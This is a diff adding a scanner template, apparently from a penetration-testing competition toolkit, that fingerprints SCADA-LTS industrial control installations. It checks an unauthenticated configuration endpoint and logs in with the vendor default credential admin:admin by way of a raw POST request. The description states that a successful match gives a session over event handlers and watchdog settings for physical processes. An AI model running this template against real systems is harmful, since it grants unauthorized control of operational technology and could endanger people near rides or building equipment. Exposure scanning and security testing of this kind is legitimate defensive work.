@@ -1,0 +1,80 @@
+# SCADA-LTS default credential login and unauth config endpoint.
+id: scadalts-default-login
+
+info:
+  name: SCADA-LTS Default Credentials and Config Exposure
+  author: cptc-toolkit
+  severity: high
+  metadata:
+    max-request: 3
+    kind: attack
+  description: |
+    SCADA-LTS is a Java/Tomcat SCADA platform used for ride and building
+    monitoring. Stock deployments document the default credential admin:admin
+    and the /ScadaLTS/api/config endpoint answers unauthenticated.
+
+    This template confirms the product by its branded login form, checks the
+    config endpoint, and POSTs the default credential. A match on the config
+    endpoint alone means internal system configuration (data sources,
+    thresholds, manager settings) is readable without any login. A match on
+    the login means an authenticated SCADA session: datapoint views, event
+    handlers and the watchdog settings that control physical processes.
+
+    Two GETs and one POST. The credential is a documented vendor default.
+  reference:
+    - https://github.com/SCADA-LTS/Scada-LTS
+  tags: ot,scada,default-login,exposure,attack
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ScadaLTS/login.htm"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ScadaLTS"
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/ScadaLTS/api/config"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "contains(to_lower(content_type), 'json')"
+
+  - raw:
+      - |
+        POST /ScadaLTS/login.htm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin&login=Login
+    redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "watchlist"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "login.htm"
+          - "Incorrect"
